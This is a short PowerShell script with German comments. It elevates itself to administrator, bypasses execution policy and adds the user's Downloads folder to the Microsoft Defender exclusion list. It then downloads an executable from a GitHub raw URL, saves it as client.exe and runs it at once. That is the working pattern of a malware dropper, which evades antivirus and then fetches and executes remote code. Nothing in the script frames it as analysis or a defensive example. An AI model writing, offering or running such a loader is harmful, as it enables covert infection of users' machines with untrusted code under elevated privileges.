# --- Prüfen ob Skript als Administrator läuft ---
# Falls nicht, mit Admin-Rechten neu starten
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Starte Skript mit Administratorrechten..."
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}


Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
$url = 'https://github.com/Martimightymax/test/raw/refs/heads/main/Connected.exe'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile